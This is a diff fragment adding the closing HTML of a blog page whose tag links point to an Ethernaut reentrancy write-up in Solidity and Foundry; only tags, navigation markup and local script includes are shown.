+      <a class="tag-none-link" href="/tags/CEI%E6%A8%A1%E5%BC%8F/" rel="tag">#CEI模式</a> <a class="tag-none-link" href="/tags/Ethernaut/" rel="tag">#Ethernaut</a> <a class="tag-none-link" href="/tags/Foundry/" rel="tag">#Foundry</a> <a class="tag-none-link" href="/tags/Reentrancy/" rel="tag">#Reentrancy</a> <a class="tag-none-link" href="/tags/Solidity/" rel="tag">#Solidity</a> <a class="tag-none-link" href="/tags/%E6%99%BA%E8%83%BD%E5%90%88%E7%BA%A6%E5%AE%89%E5%85%A8/" rel="tag">#智能合约安全</a> <a class="tag-none-link" href="/tags/%E9%87%8D%E5%85%A5%E6%94%BB%E5%87%BB/" rel="tag">#重入攻击</a>
+    </div>
+    
+  
+
+  <div class="divider"></div>
+</div>
+  
+
+  <div class="book-tocbot">
+</div>
+<div class="book-tocbot-menu">
+  <a class="book-toc-expand" onclick="expand_toc()">Expand all</a>
+  <a onclick="go_top()">Back to top</a>
+  <a onclick="go_bottom()">Go to bottom</a>
+</div>
+
+
+<script src="/js/book-toc.js"></script>
+
+</div>
+      </div>
+    </div>
+  </div>
+  
+  <a class="off-canvas-overlay" onclick="hide_canvas()"></a>
+</div>
+
+</body>
+</html>
+
+
+<script src="/js/book.js"></script>
